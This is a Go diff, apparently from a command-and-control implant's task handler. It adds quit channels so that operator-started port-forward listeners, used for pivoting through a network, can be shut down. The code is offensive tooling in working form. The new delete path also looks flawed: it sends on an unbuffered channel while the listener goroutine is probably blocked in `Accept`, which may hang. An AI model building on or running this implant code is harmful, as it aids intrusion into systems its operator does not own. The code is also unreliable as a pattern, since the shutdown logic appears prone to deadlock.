@@ -23,6 +23,7 @@ import (
 
 var PortFwdMap = make(map[int]string)
 var PortFwdListenerMap = make(map[int]net.Listener)
+var PortFwdListenerQuitMap = make(map[int](chan bool))
 
 func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string, key []byte, beacon_name string, rhost string, url string) {
 	for _, task := range tasksToDo {
@@ -130,14 +131,21 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 				}
 
 				// listen for connections
+				quit := make(chan bool)
 				go func(s net.Listener, rhost string, rport string) {
 					for {
-						client, _ := s.Accept()
-						go handleForward(client, rhost, rport)
+						select {
+						case <-quit:
+							return
+						default:
+							client, _ := s.Accept()
+							go handleForward(client, rhost, rport)
+						}
 					}
 				}(forwarder, rhost, rport)
 
 				PortFwdListenerMap[len(PortFwdListenerMap)] = forwarder
+				PortFwdListenerQuitMap[len(PortFwdListenerQuitMap)] = quit
 			} else if strings.HasPrefix(taskData, "del") {
 				taskDataSplit := strings.Split(taskData, " / ")
 				id := taskDataSplit[1]
@@ -147,6 +155,7 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 					break
 				}
 
+				PortFwdListenerQuitMap[intId] <- false
 				PortFwdListenerMap[intId].Close()
 				PortFwdMap[intId] = PortFwdMap[intId] + " (killed)"
 			} else if strings.HasPrefix(taskData, "list") {
